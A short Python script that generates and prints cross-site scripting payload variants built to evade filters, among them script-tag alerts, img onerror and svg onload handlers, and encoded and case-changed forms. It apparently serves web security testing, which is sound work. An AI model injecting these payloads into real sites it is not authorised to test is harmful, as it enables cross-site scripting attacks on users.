import urllib.parse

# Base payload
base_payload = "<script>alert('XSS')</script>"

# Different evasion techniques
payloads = [
    base_payload,
    base_payload.replace("script", "scr<script>ipt"),  # Breaking the keyword
    "<img src=x onerror=alert('XSS')>",                # Using image error
    "<svg/onload=alert('XSS')>",                       # Using SVG
    urllib.parse.quote(base_payload),                  # URL encoding
    base_payload.upper(),                              # Uppercase variation
    base_payload.replace("<", "&lt;").replace(">", "&gt;"), # HTML entity
]

print("Generated Payloads:")
for i, p in enumerate(payloads, 1):
    print(f"{i}. {p}")
